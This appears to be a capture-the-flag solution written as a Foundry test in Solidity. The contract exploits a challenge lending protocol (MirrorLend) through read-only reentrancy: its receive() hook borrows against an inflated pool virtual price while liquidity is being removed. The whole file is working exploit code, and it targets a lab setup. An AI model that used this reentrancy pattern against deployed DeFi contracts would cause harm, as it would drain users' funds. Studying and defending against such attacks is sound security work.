
pragma solidity 0.8.24;

import "../src/Setup.sol";
import "../src/Token.sol";
import "../src/Pool.sol";
import "../src/MirrorLend.sol";

interface Vm {
    function deal(address, uint256) external;
}

contract Solve {
    Vm constant vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    Token token;
    Pool pool;
    MirrorLend lend;
    bool entered;

    function test_solve() external {
        vm.deal(address(this), 300 ether);
        Setup setup = new Setup{value: 10 ether}(address(this));
        token = setup.token();
        pool = setup.pool();
        lend = setup.lend();

        token.approve(address(pool), type(uint256).max);
        pool.addLiquidity{value: 100 ether}(100 ether);

        pool.approve(address(lend), type(uint256).max);
        lend.deposit(100 ether);

        pool.removeLiquidity(100 ether);

        require(setup.isSolved(), "not solved");
    }

    receive() external payable {
        if (!entered) {
            entered = true;
            uint256 amt = lend.collateralLP(address(this)) * pool.get_virtual_price() / 1e18;
            lend.borrow(amt);
        }
    }
}
